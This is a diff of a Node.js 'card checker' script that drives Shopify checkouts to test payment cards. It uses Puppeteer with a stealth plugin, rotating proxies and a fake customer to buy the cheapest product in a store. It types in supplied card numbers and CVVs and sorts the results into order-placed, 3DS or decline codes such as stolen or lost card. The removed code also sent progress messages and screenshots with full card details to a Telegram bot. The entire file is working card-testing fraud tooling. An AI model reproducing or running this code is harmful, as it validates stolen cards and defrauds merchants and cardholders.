@@ -1,904 +1,612 @@
-const axios = require("axios");
+// ==========================================
+// SHOPIFY.JS — Core Checker Logic
+// ==========================================
+
 const puppeteer = require("puppeteer-extra");
 const StealthPlugin = require("puppeteer-extra-plugin-stealth");
+const axios = require("axios");
+const { sleep, humanDelay, parseCC, parseProxy, proxyToArg, getFakeCustomer } = require("./helpers");
+
 puppeteer.use(StealthPlugin());
 
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-function escapeHTML(str) {
-  if (!str) return "";
-  return String(str)
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;");
-}
-
-function parseCC(ccInput) {
-  const parts = ccInput.split("|");
-  if (parts.length < 4) return null;
-  return {
-    number: parts[0].trim(),
-    month: parts[1].trim().padStart(2, "0"),
-    year: parts[2].trim().length === 2 ? "20" + parts[2].trim() : parts[2].trim(),
-    cvv: parts[3].trim()
-  };
-}
-
-// ============ BIN LOOKUP ============
-async function getBinInfo(bin) {
+// ==========================================
+// GET CHEAPEST PRODUCT FROM STORE
+// ==========================================
+async function getCheapestProduct(site) {
   try {
-    const r = await axios.get("https://lookup.binlist.net/" + bin, {
-      timeout: 5000,
-      headers: { "Accept-Version": "3" }
-    });
-    if (r.data) {
-      return {
-        brand: (r.data.scheme || "VISA").toUpperCase(),
-        issuer: (r.data.bank?.name || "BANK").toUpperCase(),
-        country: (r.data.country?.name || "USA").toUpperCase(),
-        flag: r.data.country?.emoji || ""
-      };
-    }
-  } catch(e) {}
-  return { brand: "VISA", issuer: "BANK", country: "USA", flag: "" };
-}
+    const url = site.endsWith("/")
+      ? site + "products.json?limit=250"
+      : site + "/products.json?limit=250";
 
-// ============ CLASSIFY RESPONSE ============
-function classifyResponse(responseText, approved) {
-  const r = (responseText || "").toUpperCase();
-  const chargedKw = ["CHARGED", "CAPTURED", "PAID", "PAYMENT_AUTHORIZED", "THANK YOU", "ORDER CONFIRMED", "ORDER #"];
-  const approvedKw = [
-    "APPROVED", "SUCCESS", "AUTHORIZED",
-    "OTP_REQUIRED", "3DS_REQUIRED", "3D_SECURE",
-    "AUTHENTICATION_REQUIRED", "PENDING", "REDIRECT",
-    "INCORRECT_CVC", "INCORRECT_NUMBER", "SECURITY CODE"
-  ];
-  const declinedKw = [
-    "DECLINED", "INSUFFICIENT", "DO NOT HONOR",
-    "INVALID", "EXPIRED", "STOLEN", "BLOCKED",
-    "RESTRICTED", "CARD_DECLINED", "LOST", "PICKUP",
-    "TRANSACTION FAILED", "PAYMENT FAILED"
-  ];
-
-  for (const kw of chargedKw) if (r.includes(kw)) return "charged";
-  for (const kw of declinedKw) if (r.includes(kw)) return "declined";
-  for (const kw of approvedKw) if (r.includes(kw)) return "approved";
-  if (approved) return "approved";
-  return "declined";
-}
-
-// ============ SCREENSHOT ============
-async function takeScreenshot(page) {
-  try {
-    return await page.screenshot({ encoding: "base64", type: "jpeg", quality: 70, fullPage: false });
-  } catch(e) { return null; }
-}
-
-async function sendScreenshot(bot, chatId, base64img, caption) {
-  try {
-    if (!base64img || !bot || !chatId) return;
-    const buf = Buffer.from(base64img, "base64");
-    await bot.sendPhoto(chatId, buf, { caption: caption || "", parse_mode: "HTML" });
-  } catch(e) {
-    console.log("[SS ERROR]", e.message);
-  }
-}
-
-// ============ CLOSE ALL POPUPS ============
-async function closePopups(page) {
-  // Common popup/overlay close selectors
-  const popupSelectors = [
-    // Close buttons
-    'button[class*="close"]',
-    'button[class*="dismiss"]',
-    'button[aria-label*="close" i]',
-    'button[aria-label*="dismiss" i]',
-    '[class*="popup"] button[class*="close"]',
-    '[class*="modal"] button[class*="close"]',
-    '[class*="overlay"] button[class*="close"]',
-    // X buttons
-    '.klaviyo-close-form',
-    '#closeIconContainer',
-    '.needsclick.klaviyo_close_button',
-    // Cookie
-    'button[id*="cookie"] ',
-    'button[class*="cookie"]',
-    // Newsletter
-    '[class*="newsletter"] button[class*="close"]',
-    // Attentive
-    '#attentive_close_button',
-    // Common close text
-    'button[class*="dismiss"]',
-    '.popup__close',
-    '.modal__close',
-    '.js-modal-close',
-    // Offer popups
-    '[class*="offer"] button',
-    '[class*="promo"] [class*="close"]'
-  ];
-
-  for (const sel of popupSelectors) {
-    try {
-      const el = await page.$(sel);
-      if (el) {
-        await el.click();
-        await sleep(300);
-        console.log("[POPUP CLOSED]", sel);
-      }
-    } catch(e) {}
-  }
-
-  // Press Escape key to close any modal
-  try {
-    await page.keyboard.press("Escape");
-    await sleep(300);
-  } catch(e) {}
-}
-
-// ============ GET PRODUCT ============
-async function getProductREST(storeUrl) {
-  try {
-    const url = storeUrl.replace(/\/$/, "") + "/products.json?limit=250";
     const res = await axios.get(url, {
       timeout: 10000,
-      headers: { "User-Agent": "Mozilla/5.0" }
+      headers: {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        Accept: "application/json",
+      },
     });
+
     const products = res.data?.products || [];
-    if (!products.length) return null;
+    if (products.length === 0) return null;
 
-    // Try to find cheapest under $5
-    let cheapest = null;
-    for (const product of products) {
-      for (const variant of (product.variants || [])) {
-        const price = parseFloat(variant.price);
-        if (price > 0 && price <= 5.00) {
-          if (!cheapest || price < parseFloat(cheapest.price)) {
-            cheapest = {
-              id: variant.id,
-              title: product.title,
-              price: variant.price,
-              variantId: variant.id,
-              handle: product.handle
-            };
-          }
-        }
-      }
-    }
+    // Flatten all variants
+    let allVariants = [];
+    products.forEach((p) => {
+      p.variants?.forEach((v) => {
+        allVariants.push({
+          productTitle: p.title,
+          variantId: v.id,
+          price: parseFloat(v.price || "0"),
+          available: v.available !== false,
+        });
+      });
+    });
 
-    // Try under $20
-    if (!cheapest) {
-      for (const product of products) {
-        for (const variant of (product.variants || [])) {
-          const price = parseFloat(variant.price);
-          if (price > 0 && price <= 20.00) {
-            if (!cheapest || price < parseFloat(cheapest.price)) {
-              cheapest = {
-                id: variant.id,
-                title: product.title,
-                price: variant.price,
-                variantId: variant.id,
-                handle: product.handle
-              };
-            }
-          }
-        }
-      }
-    }
+    // Filter available, price > 0, sort cheapest first
+    const available = allVariants
+      .filter((v) => v.available && v.price > 0)
+      .sort((a, b) => a.price - b.price);
 
-    // Fallback — first available product
-    if (!cheapest) {
-      const p = products[0];
-      const v = p?.variants?.[0];
-      if (v) cheapest = {
-        id: v.id,
-        title: p.title,
-        price: v.price,
-        variantId: v.id,
-        handle: p.handle
-      };
-    }
-
-    return cheapest;
-  } catch(e) {
-    console.log("[PRODUCT REST ERROR]", e.message);
+    return available[0] || allVariants[0] || null;
+  } catch (e) {
+    console.error("[PRODUCT] Error:", e.message);
     return null;
   }
 }
 
-// ============ SAFE TYPE IN FIELD ============
-async function fillField(page, selectors, value, frameCtx = null) {
-  const ctx = frameCtx || page;
-  if (!Array.isArray(selectors)) selectors = [selectors];
-
-  for (const sel of selectors) {
-    try {
-      const el = await ctx.$(sel);
-      if (el) {
-        await el.click({ clickCount: 3 });
-        await sleep(100);
-        await el.type(value, { delay: 60 });
-        console.log("[FILLED]", sel, "=", value);
-        return true;
-      }
-    } catch(e) {}
-  }
-  return false;
-}
-
-// ============ WAIT FOR SELECTOR SAFE ============
-async function waitForSel(page, selector, timeout = 5000) {
+// ==========================================
+// DISMISS ALL POPUPS
+// ==========================================
+async function dismissPopups(page) {
   try {
-    await page.waitForSelector(selector, { visible: true, timeout });
-    return true;
-  } catch(e) { return false; }
-}
+    // Press Escape
+    await page.keyboard.press("Escape");
+    await sleep(300);
 
-// ============ GET ALL FRAMES ============
-function getAllFrames(page) {
-  return page.frames();
-}
+    // Click close buttons
+    const closeSelectors = [
+      'button[aria-label="Close"]',
+      'button[aria-label="close"]',
+      'button[aria-label="Dismiss"]',
+      '[class*="close"]',
+      '[class*="Close"]',
+      '[class*="dismiss"]',
+      '[class*="Dismiss"]',
+      '[id*="close"]',
+      '[id*="popup"] button',
+      '[id*="modal"] button',
+      '[class*="modal"] [class*="close"]',
+      '[class*="popup"] [class*="close"]',
+      '.klaviyo-close',
+      '.privy-dismiss-text',
+      '.pum-close',
+      '[data-dismiss="modal"]',
+      'button[title="Close"]',
+      'button[title="close"]',
+      '.modal-close',
+      '.popup-close',
+      '[class*="newsletter"] [class*="close"]',
+      '[class*="overlay"] [class*="close"]',
+    ];
 
-// ============ FILL CARD IN SHOPIFY IFRAME ============
-async function fillCardInFrames(page, card) {
-  const frames = getAllFrames(page);
-  console.log("[FRAMES]", frames.map(f => f.name() + " | " + f.url().substring(0, 80)));
-
-  let filled = { number: false, expiry: false, cvv: false, name: false };
-
-  for (const frame of frames) {
-    const frameName = frame.name().toLowerCase();
-    const frameUrl = frame.url().toLowerCase();
-
-    // ---- Card Number Frame ----
-    if (!filled.number && (
-      frameName.includes("number") || frameUrl.includes("number") ||
-      frameName.includes("card-fields-number")
-    )) {
+    for (const selector of closeSelectors) {
       try {
-        await frame.waitForSelector("input", { timeout: 3000 });
-        const inp = await frame.$("input");
-        if (inp) {
-          await inp.click({ clickCount: 3 });
-          await inp.type(card.number, { delay: 80 });
-          filled.number = true;
-          console.log("[CARD NUMBER FILLED] in frame:", frameName);
+        const elements = await page.$$(selector);
+        for (const el of elements) {
+          try {
+            const visible = await el.isIntersectingViewport().catch(() => false);
+            if (visible) {
+              await el.click();
+              await sleep(200);
+            }
+          } catch (e) {}
         }
-      } catch(e) { console.log("[NUM FRAME ERR]", e.message); }
+      } catch (e) {}
     }
 
-    // ---- Expiry Frame ----
-    if (!filled.expiry && (
-      frameName.includes("expiry") || frameUrl.includes("expiry") ||
-      frameName.includes("card-fields-expiry")
-    )) {
-      try {
-        await frame.waitForSelector("input", { timeout: 3000 });
-        const inp = await frame.$("input");
-        if (inp) {
-          await inp.click({ clickCount: 3 });
-          await inp.type(card.month + "/" + card.year.slice(-2), { delay: 80 });
-          filled.expiry = true;
-          console.log("[EXPIRY FILLED] in frame:", frameName);
-        }
-      } catch(e) { console.log("[EXP FRAME ERR]", e.message); }
-    }
-
-    // ---- CVV Frame ----
-    if (!filled.cvv && (
-      frameName.includes("verification") || frameUrl.includes("verification") ||
-      frameName.includes("cvv") || frameName.includes("cvc") ||
-      frameName.includes("card-fields-verification")
-    )) {
-      try {
-        await frame.waitForSelector("input", { timeout: 3000 });
-        const inp = await frame.$("input");
-        if (inp) {
-          await inp.click({ clickCount: 3 });
-          await inp.type(card.cvv, { delay: 80 });
-          filled.cvv = true;
-          console.log("[CVV FILLED] in frame:", frameName);
-        }
-      } catch(e) { console.log("[CVV FRAME ERR]", e.message); }
-    }
-
-    // ---- Name Frame ----
-    if (!filled.name && (
-      frameName.includes("name") || frameUrl.includes("name") ||
-      frameName.includes("card-fields-name")
-    )) {
-      try {
-        await frame.waitForSelector("input", { timeout: 3000 });
-        const inp = await frame.$("input");
-        if (inp) {
-          await inp.click({ clickCount: 3 });
-          await inp.type("John Doe", { delay: 60 });
-          filled.name = true;
-          console.log("[NAME FILLED] in frame:", frameName);
-        }
-      } catch(e) { console.log("[NAME FRAME ERR]", e.message); }
-    }
-  }
-
-  // ---- Fallback: Direct page fill (non-iframe sites) ----
-  if (!filled.number) {
-    console.log("[TRYING DIRECT CARD FILL]");
-    await fillField(page, [
-      'input[name="number"]',
-      'input[autocomplete="cc-number"]',
-      'input[data-card-field="number"]',
-      'input[placeholder*="Card number" i]',
-      'input[placeholder*="1234" i]',
-      '#card_number'
-    ], card.number);
-  }
-
-  if (!filled.expiry) {
-    const exFilled = await fillField(page, [
-      'input[name="expiry"]',
-      'input[autocomplete="cc-exp"]',
-      'input[placeholder*="MM / YY" i]',
-      'input[placeholder*="expiry" i]'
-    ], card.month + " / " + card.year.slice(-2));
-
-    if (!exFilled) {
-      await fillField(page, ['input[name="month"]', 'input[autocomplete="cc-exp-month"]'], card.month);
-      await fillField(page, ['input[name="year"]', 'input[autocomplete="cc-exp-year"]'], card.year.slice(-2));
-    }
-  }
-
-  if (!filled.cvv) {
-    await fillField(page, [
-      'input[name="verification_value"]',
-      'input[autocomplete="cc-csc"]',
-      'input[name="cvv"]',
-      'input[placeholder*="CVV" i]',
-      'input[placeholder*="CVC" i]',
-      '#card_cvv'
-    ], card.cvv);
-  }
-
-  return filled;
-}
-
-// ============ CLICK PAY BUTTON ============
-async function clickPayButton(page) {
-  // Try by text content first (most reliable)
-  try {
-    const clicked = await page.evaluate(() => {
-      const buttons = Array.from(document.querySelectorAll('button, input[type="submit"]'));
-      const payBtn = buttons.find(b => {
-        const txt = (b.innerText || b.value || "").toLowerCase();
-        return txt.includes("pay") || txt.includes("place order") ||
-               txt.includes("complete") || txt.includes("submit") ||
-               txt.includes("confirm");
+    // JS — Remove fixed overlays
+    await page.evaluate(() => {
+      const selectors = [
+        '[class*="modal"]', '[class*="popup"]',
+        '[class*="overlay"]', '[class*="backdrop"]',
+        '[id*="modal"]', '[id*="popup"]',
+        '[class*="newsletter"]', '[class*="cookie"]',
+      ];
+      selectors.forEach((sel) => {
+        document.querySelectorAll(sel).forEach((el) => {
+          try {
+            const style = window.getComputedStyle(el);
+            if (
+              (style.position === "fixed" || style.position === "absolute") &&
+              parseInt(style.zIndex) > 50
+            ) {
+              el.style.display = "none";
+            }
+          } catch (e) {}
+        });
       });
-      if (payBtn) { payBtn.click(); return true; }
-      return false;
+      // Restore scroll
+      document.body.style.overflow = "";
+      document.body.style.paddingRight = "";
+      document.documentElement.style.overflow = "";
     });
-    if (clicked) { console.log("[PAY BTN] Clicked via text search"); return true; }
-  } catch(e) {}
 
-  // Selector fallback
-  const paySelectors = [
-    'button[type="submit"]',
-    'button[data-trekkie-id="payment_method_submit_button"]',
-    '#continue_button',
-    '.step__footer__continue-btn',
-    'input[type="submit"]',
-    '[data-testid="submit-button"]'
-  ];
+  } catch (e) {}
+}
 
-  for (const sel of paySelectors) {
+// ==========================================
+// TYPE IN FIELD — Try multiple selectors
+// ==========================================
+async function typeInField(page, selectors, value, delayMs = 70) {
+  for (const sel of selectors) {
     try {
       const el = await page.$(sel);
       if (el) {
-        await el.click();
-        console.log("[PAY BTN] Clicked:", sel);
+        await el.click({ clickCount: 3 });
+        await sleep(100);
+        await el.type(value, { delay: delayMs + Math.random() * 30 });
         return true;
       }
-    } catch(e) {}
+    } catch (e) {}
   }
   return false;
 }
 
-// ============ MAIN checkCard FUNCTION ============
-async function checkCard(ccInput, storeUrl, onStep, bot, chatId) {
-  const startTime = Date.now();
-  let binInfo = { brand: "VISA", issuer: "BANK", country: "USA", flag: "" };
-  let browser = null;
+// ==========================================
+// CLICK BUTTON — Try multiple selectors
+// ==========================================
+async function clickButton(page, selectors) {
+  for (const sel of selectors) {
+    try {
+      const btn = await page.$(sel);
+      if (btn) {
+        const visible = await btn.isIntersectingViewport().catch(() => true);
+        if (visible) {
+          await btn.click();
+          return true;
+        }
+      }
+    } catch (e) {}
+  }
+  return false;
+}
 
-  const card = parseCC(ccInput);
-  if (!card) {
-    return {
-      success: false,
-      response: "INVALID_FORMAT",
-      category: "declined",
-      binInfo,
-      timeTaken: "0.00",
-      product: null
-    };
+// ==========================================
+// FILL CONTACT/SHIPPING INFO
+// ==========================================
+async function fillCustomerInfo(page, customer) {
+  try {
+    // Email
+    await typeInField(page, [
+      '#email',
+      '#checkout_email',
+      'input[type="email"]',
+      'input[autocomplete="email"]',
+      'input[name="email"]',
+      '[data-testid="email-field"] input',
+    ], customer.email);
+
+    await humanDelay(300, 600);
+
+    // First Name
+    await typeInField(page, [
+      '#firstName', '#checkout_shipping_address_first_name',
+      'input[name="firstName"]', 'input[autocomplete="given-name"]',
+      'input[name="first_name"]',
+    ], customer.firstName);
+
+    // Last Name
+    await typeInField(page, [
+      '#lastName', '#checkout_shipping_address_last_name',
+      'input[name="lastName"]', 'input[autocomplete="family-name"]',
+      'input[name="last_name"]',
+    ], customer.lastName);
+
+    await humanDelay(200, 500);
+
+    // Address
+    await typeInField(page, [
+      '#address1', '#checkout_shipping_address_address1',
+      'input[name="address1"]', 'input[autocomplete="address-line1"]',
+    ], customer.address);
+
+    await humanDelay(300, 600);
+
+    // City
+    await typeInField(page, [
+      '#city', '#checkout_shipping_address_city',
+      'input[name="city"]', 'input[autocomplete="address-level2"]',
+    ], customer.city);
+
+    // ZIP
+    await typeInField(page, [
+      '#postalCode', '#zip', '#checkout_shipping_address_zip',
+      'input[name="postalCode"]', 'input[name="zip"]',
+      'input[autocomplete="postal-code"]',
+    ], customer.zip);
+
+    await humanDelay(500, 1000);
+
+    // Continue to Shipping
+    const clicked = await clickButton(page, [
+      'button[type="submit"]',
+      '#continue_button',
+      '[data-testid="continue-button"]',
+      'button[id*="continue"]',
+      'input[type="submit"]',
+    ]);
+
+    if (clicked) {
+      await humanDelay(2000, 3500);
+      await dismissPopups(page);
+    }
+
+    // Continue to Payment
+    await clickButton(page, [
+      'button[type="submit"]',
+      '#continue_button',
+      '[data-testid="continue-button"]',
+      'button[id*="continue"]',
+    ]);
+
+    await humanDelay(2000, 3500);
+    await dismissPopups(page);
+
+  } catch (e) {
+    console.error("[FILL INFO] Error:", e.message);
+  }
+}
+
+// ==========================================
+// FILL CARD DETAILS
+// ==========================================
+async function fillCardDetails(page, cc, customer) {
+  try {
+    await humanDelay(500, 1000);
+
+    // Check for iframe (Shopify card fields are in iframes)
+    const frames = await page.frames();
+    let cardFrame = null;
+
+    for (const frame of frames) {
+      const url = frame.url();
+      if (
+        url.includes("shopifycs.com") ||
+        url.includes("pay.shopify") ||
+        url.includes("checkout.shopify")
+      ) {
+        cardFrame = frame;
+        break;
+      }
+    }
+
+    const target = cardFrame || page;
+
+    // Card Number
+    const numFilled = await typeInField(target, [
+      'input[autocomplete="cc-number"]',
+      'input[name="number"]',
+      '#number',
+      '[data-card-field="number"] input',
+      'input[placeholder*="Card number"]',
+      'input[placeholder*="card number"]',
+    ], cc.number);
+
+    await humanDelay(400, 700);
+
+    // Expiry Month
+    await typeInField(target, [
+      'input[autocomplete="cc-exp-month"]',
+      'input[name="month"]',
+      '#month',
+      'input[placeholder*="MM"]',
+    ], cc.month);
+
+    await humanDelay(200, 400);
+
+    // Expiry Year
+    await typeInField(target, [
+      'input[autocomplete="cc-exp-year"]',
+      'input[name="year"]',
+      '#year',
+      'input[placeholder*="YY"]',
+      'input[placeholder*="YYYY"]',
+    ], cc.year);
+
+    await humanDelay(200, 400);
+
+    // CVV
+    await typeInField(target, [
+      'input[autocomplete="cc-csc"]',
+      'input[name="verification_value"]',
+      '#verification_value',
+      'input[placeholder*="CVV"]',
+      'input[placeholder*="CVC"]',
+      'input[placeholder*="Security"]',
+    ], cc.cvv);
+
+    await humanDelay(200, 400);
+
+    // Cardholder Name
+    await typeInField(target, [
+      'input[autocomplete="cc-name"]',
+      'input[name="name"]',
+      '#name',
+      'input[placeholder*="Name on card"]',
+      'input[placeholder*="Cardholder"]',
+    ], `${customer.firstName} ${customer.lastName}`);
+
+    console.log(`[CARD] Fields filled`);
+    return true;
+
+  } catch (e) {
+    console.error("[CARD FILL] Error:", e.message);
+    return false;
+  }
+}
+
+// ==========================================
+// PARSE FINAL RESULT FROM PAGE
+// ==========================================
+function parseResult(url, content) {
+  const u = url.toLowerCase();
+  const c = content.toLowerCase();
+
+  // ✅ ORDER PLACED
+  if (
+    u.includes("/thank_you") ||
+    u.includes("thank_you") ||
+    u.includes("/orders/") ||
+    c.includes("thank you for your order") ||
+    c.includes("order confirmed") ||
+    c.includes("your order is confirmed") ||
+    c.includes("order is being processed")
+  ) {
+    return { Status: true, Response: "ORDER_PLACED", Gateway: "Shopify Payments", Price: 1.0 };
   }
 
-  const bin = card.number.substring(0, 6);
-  const binPromise = getBinInfo(bin).then(b => { binInfo = b; }).catch(() => {});
+  // ✅ 3DS
+  if (
+    u.includes("3ds") ||
+    c.includes("3d secure") ||
+    c.includes("authentication required") ||
+    c.includes("verify your card") ||
+    c.includes("additional authentication")
+  ) {
+    return { Status: true, Response: "3D_SECURE_REQUIRED", Gateway: "Shopify Payments", Price: 1.0 };
+  }
+
+  // ❌ Specific Declines
+  const declines = [
+    { k: "do not honor", r: "DO_NOT_HONOR" },
+    { k: "insufficient funds", r: "INSUFFICIENT_FUNDS" },
+    { k: "card was declined", r: "CARD_DECLINED" },
+    { k: "your card was declined", r: "CARD_DECLINED" },
+    { k: "invalid card number", r: "INVALID_CARD_NUMBER" },
+    { k: "card number is invalid", r: "INVALID_CARD_NUMBER" },
+    { k: "expired card", r: "EXPIRED_CARD" },
+    { k: "card has expired", r: "EXPIRED_CARD" },
+    { k: "incorrect cvc", r: "INCORRECT_CVV" },
+    { k: "incorrect zip", r: "INCORRECT_ZIP" },
+    { k: "stolen card", r: "STOLEN_CARD" },
+    { k: "lost card", r: "LOST_CARD" },
+    { k: "restricted card", r: "RESTRICTED_CARD" },
+    { k: "security violation", r: "SECURITY_VIOLATION" },
+    { k: "transaction not allowed", r: "TRANSACTION_NOT_ALLOWED" },
+    { k: "generic decline", r: "GENERIC_DECLINE" },
+    { k: "processing error", r: "PROCESSING_ERROR" },
+    { k: "call your bank", r: "CALL_YOUR_BANK" },
+    { k: "pickup card", r: "PICKUP_CARD" },
+    { k: "blocked card", r: "BLOCKED_CARD" },
+  ];
+
+  for (const { k, r } of declines) {
+    if (c.includes(k)) {
+      return { Status: false, Response: r, Gateway: "Shopify Payments" };
+    }
+  }
+
+  // Generic declined
+  if (c.includes("declined") || c.includes("was declined")) {
+    return { Status: false, Response: "DECLINED", Gateway: "Shopify Payments" };
+  }
+
+  // Still on checkout page
+  if (u.includes("checkout")) {
+    return { Status: false, Response: "CHECKOUT_INCOMPLETE", Gateway: "Shopify Payments" };
+  }
+
+  return { Status: false, Response: "UNKNOWN", Gateway: "Shopify Payments" };
+}
+
+// ==========================================
+// MAIN CHECK FUNCTION
+// ==========================================
+async function checkShopify(site, ccStr, proxyStr) {
+  const cc = parseCC(ccStr);
+  if (!cc) {
+    return { Status: false, Response: "INVALID_CC_FORMAT", Gateway: "Shopify Payments" };
+  }
+
+  const proxy = parseProxy(proxyStr);
+  const customer = getFakeCustomer();
+
+  // Ensure site ends with /
+  if (!site.endsWith("/")) site += "/";
+
+  console.log(`\n[CHECK] ==================`);
+  console.log(`[CHECK] CC: ${cc.number}|${cc.month}|${cc.year}|${cc.cvv}`);
+  console.log(`[CHECK] Site: ${site}`);
+  console.log(`[CHECK] Proxy: ${proxyStr || "None"}`);
+  console.log(`[CHECK] Customer: ${customer.firstName} ${customer.lastName}`);
+
+  // ==========================================
+  // STEP 1 — Get cheapest product
+  // ==========================================
+  const product = await getCheapestProduct(site);
+  if (!product) {
+    return { Status: false, Response: "NO_PRODUCTS_FOUND", Gateway: "Shopify Payments" };
+  }
+  console.log(`[PRODUCT] ${product.productTitle} — $${product.price} (ID: ${product.variantId})`);
+
+  // ==========================================
+  // STEP 2 — Launch Puppeteer
+  // ==========================================
+  const launchArgs = [
+    "--no-sandbox",
+    "--disable-setuid-sandbox",
+    "--disable-dev-shm-usage",
+    "--disable-accelerated-2d-canvas",
+    "--no-first-run",
+    "--no-zygote",
+    "--disable-gpu",
+    "--disable-blink-features=AutomationControlled",
+    "--disable-infobars",
+    "--window-size=1366,768",
+    "--disable-extensions",
+    "--disable-plugins",
+    "--disable-images",
+  ];
+
+  if (proxy) {
+    launchArgs.push(`--proxy-server=${proxy.host}:${proxy.port}`);
+    console.log(`[PROXY] Using: ${proxy.host}:${proxy.port}`);
+  }
+
+  let browser = null;
 
   try {
-    // ============ STEP 1 — Browser ============
-    await onStep(
-      "⏳ <b>Checking Card...</b>\n━━━━━━━━━━━━━━━\n" +
-      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n━━━━━━━━━━━━━━━\n" +
-      "🔄 <b>[1/6]</b> Launching browser...\n⬜⬜⬜⬜⬜⬜"
-    );
-
     browser = await puppeteer.launch({
       headless: "new",
-      args: [
-        "--no-sandbox",
-        "--disable-setuid-sandbox",
-        "--disable-dev-shm-usage",
-        "--disable-gpu",
-        "--disable-blink-features=AutomationControlled",
-        "--no-first-run",
-        "--no-zygote",
-        "--single-process",
-        "--window-size=1280,720"
-      ]
+      args: launchArgs,
+      ignoreHTTPSErrors: true,
+      timeout: 30000,
     });
 
     const page = await browser.newPage();
 
+    // Proxy auth
+    if (proxy?.username && proxy?.password) {
+      await page.authenticate({
+        username: proxy.username,
+        password: proxy.password,
+      });
+    }
+
+    // Setup page
+    await page.setViewport({ width: 1366, height: 768 });
     await page.setUserAgent(
       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
     );
-    await page.setViewport({ width: 1280, height: 720 });
+    await page.setExtraHTTPHeaders({
+      "Accept-Language": "en-US,en;q=0.9",
+    });
 
-    // Block unnecessary resources for speed
+    // Block heavy resources for speed
     await page.setRequestInterception(true);
     page.on("request", (req) => {
       const type = req.resourceType();
-      if (["image", "stylesheet", "font", "media"].includes(type)) {
+      if (["image", "font", "media"].includes(type)) {
         req.abort();
       } else {
         req.continue();
       }
     });
 
-    // ============ STEP 2 — Get Product ============
-    await onStep(
-      "⏳ <b>Checking Card...</b>\n━━━━━━━━━━━━━━━\n" +
-      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n━━━━━━━━━━━━━━━\n" +
-      "✅ <b>[1/6]</b> Browser ready!\n" +
-      "🔄 <b>[2/6]</b> Fetching products...\n🟩⬜⬜⬜⬜⬜"
-    );
+    // Set page timeout
+    page.setDefaultTimeout(30000);
+    page.setDefaultNavigationTimeout(30000);
 
-    const product = await getProductREST(storeUrl);
-    if (!product) {
-      await browser.close();
-      await binPromise;
-      return {
-        success: false,
-        response: "NO_PRODUCT_FOUND",
-        category: "declined",
-        binInfo,
-        timeTaken: ((Date.now() - startTime) / 1000).toFixed(2),
-        product: null
-      };
-    }
+    // ==========================================
+    // STEP 3 — Visit Site
+    // ==========================================
+    console.log(`[BROWSER] Visiting site...`);
+    await page.goto(site, { waitUntil: "domcontentloaded", timeout: 30000 });
+    await humanDelay(800, 1500);
+    await dismissPopups(page);
 
-    console.log("[PRODUCT]", product.title, "$" + product.price);
+    // ==========================================
+    // STEP 4 — Add to Cart via fetch
+    // ==========================================
+    console.log(`[CART] Adding to cart...`);
+    const cartUrl = site + "cart/add.js";
 
-    // ============ STEP 3 — Add to Cart ============
-    await onStep(
-      "⏳ <b>Checking Card...</b>\n━━━━━━━━━━━━━━━\n" +
-      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n━━━━━━━━━━━━━━━\n" +
-      "✅ <b>[1/6]</b> Browser ready!\n" +
-      "✅ <b>[2/6]</b> Product: $" + product.price + "\n" +
-      "🔄 <b>[3/6]</b> Adding to cart...\n🟩🟩⬜⬜⬜⬜\n" +
-      "🛒 <b>Item:</b> " + escapeHTML(product.title)
-    );
-
-    // First navigate to store (set cookies/session)
-    await page.goto(storeUrl.replace(/\/$/, ""), {
-      waitUntil: "domcontentloaded",
-      timeout: 30000
-    });
-    await sleep(1000);
-
-    // Close any popups on home page
-    await closePopups(page);
-
-    // Add to cart via API
-    const cartResult = await page.evaluate(async (variantId) => {
-      try {
-        const res = await fetch("/cart/add.js", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ id: variantId, quantity: 1 })
-        });
-        const data = await res.json();
-        return { ok: res.ok, data };
-      } catch(e) {
-        return { ok: false, error: e.message };
-      }
-    }, product.variantId);
-
-    console.log("[CART ADD]", JSON.stringify(cartResult).substring(0, 200));
-
-    if (!cartResult.ok) {
-      // Try navigating to product page and clicking add to cart button
-      const productUrl = storeUrl.replace(/\/$/, "") + "/products/" + product.handle;
-      await page.goto(productUrl, { waitUntil: "domcontentloaded", timeout: 30000 });
-      await sleep(1500);
-      await closePopups(page);
-
-      // Click add to cart button
-      const atcSelectors = [
-        'button[name="add"]',
-        'button[id*="add-to-cart" i]',
-        'button[class*="add-to-cart" i]',
-        'input[name="add"]',
-        'button[data-testid*="add-to-cart" i]',
-        'button:contains("Add to Cart")',
-        'form[action="/cart/add"] button[type="submit"]'
-      ];
-
-      for (const sel of atcSelectors) {
-        try {
-          const el = await page.$(sel);
-          if (el) {
-            await el.click();
-            console.log("[ATC CLICKED]", sel);
-            await sleep(1500);
-            break;
-          }
-        } catch(e) {}
-      }
-    }
-
-    await sleep(1000);
-
-    // ============ STEP 4 — Checkout ============
-    await onStep(
-      "⏳ <b>Checking Card...</b>\n━━━━━━━━━━━━━━━\n" +
-      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n━━━━━━━━━━━━━━━\n" +
-      "✅ <b>[1/6]</b> Browser ready!\n" +
-      "✅ <b>[2/6]</b> Product: $" + product.price + "\n" +
-      "✅ <b>[3/6]</b> Added to cart!\n" +
-      "🔄 <b>[4/6]</b> Loading checkout...\n🟩🟩🟩⬜⬜⬜"
-    );
-
-    // Go to checkout
-    await page.goto(storeUrl.replace(/\/$/, "") + "/checkout", {
-      waitUntil: "networkidle2",
-      timeout: 35000
-    });
-    await sleep(2500);
-
-    // Close checkout popups
-    await closePopups(page);
-
-    const checkoutUrl = page.url();
-    console.log("[CHECKOUT URL]", checkoutUrl);
-
-    // Screenshot — checkout
-    const ss2 = await takeScreenshot(page);
-    await sendScreenshot(bot, chatId, ss2,
-      "📋 <b>[4/6]</b> Checkout Page\n💳 <code>" + escapeHTML(ccInput) + "</code>"
-    );
-
-    // ---- Fill Contact Info ----
-    await fillField(page, [
-      'input[type="email"]',
-      'input[name="email"]',
-      '#email',
-      'input[autocomplete="email"]'
-    ], "john" + Math.floor(Math.random() * 99999) + "@gmail.com");
-
-    await sleep(500);
-
